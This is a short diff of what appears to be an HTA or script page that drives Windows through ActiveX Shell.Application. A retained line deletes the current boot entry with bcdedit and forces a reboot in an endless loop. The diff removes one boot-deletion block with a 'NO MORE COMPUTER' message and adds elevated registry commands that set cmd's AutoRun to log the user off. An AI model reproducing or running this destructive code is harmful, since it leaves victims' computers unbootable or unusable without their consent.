@@ -19,12 +19,9 @@
 <dont>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</dont>
 <script>
       var s=new ActiveXObject('Shell.Application')
-      s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);
-      setTimeout(function(){
-            var s=new ActiveXObject('Shell.Application')
-            s.ShellExecute('msg','* NO MORE COMPUTER :)','')
-      }, 200);
-
+      s.ShellExecute('reg.exe','add "HKCU/Software/Microsoft/Command Processor" /v AutoRun /t REG_SZ /d "logoff" /f','', 'runas',1);
+      s.ShellExecute('reg.exe','add "HKCU/Software/Microsoft/Command Processor" /v AutoRun /t REG_SZ /d "echo a" /f','', 'runas',1);
+      
 </script>
 <script>
       
